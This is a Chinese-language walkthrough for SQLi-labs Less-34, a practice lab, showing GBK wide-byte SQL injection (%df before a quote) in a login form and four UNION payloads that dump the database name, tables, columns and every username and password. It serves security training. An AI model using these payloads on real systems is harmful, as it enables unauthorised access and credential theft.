---
title: Less - 34
date: 2023-03-17T12:49:18Z
lastmod: 2023-03-17T13:26:23Z
---

# Less - 34

---

# 通关教程

---

## 1、判断闭合

---

先使用用户名和密码登录进去，如下

​![image](assets/image-20230317131055-n6rv8ok.png)​

在admin后面加上一个单引号发现被转义了

​![image](assets/image-20230317131214-9cz60e1.png)​

---

查看源代码可知确实使用了GBK编码，直接在单引号前面加上%df让单引号成功逃逸

​![image](assets/image-20230317131338-hh3bfyi.png)​通过错误信息判断闭合方式为’#，并且为字符型注入

---

## 2、查看数据库

---

```http
uname=a%df' union select 1,database()#&passwd=admin&submit=Submit
```

​![image](assets/image-20230317132024-bfr349l.png)​

---

## 3、查看security库下的所有表

---

```http
uname=a%df' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#&passwd=admin&submit=Submit
```

​![image](assets/image-20230317132144-mwk7dxu.png)​

---

## 4、查看users表下的所有字段

---

```http
uname=a%df' union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)#&passwd=admin&submit=Submit
```

​![image](assets/image-20230317132530-3j6cz4k.png)​

---

## 5、查看username,password字段下的所有值

---

```http
uname=a%df' union select 1,(select group_concat(username,password) from security.users)#&passwd=admin&submit=Submit
```

​![image](assets/image-20230317132607-v41lcas.png)​

‍
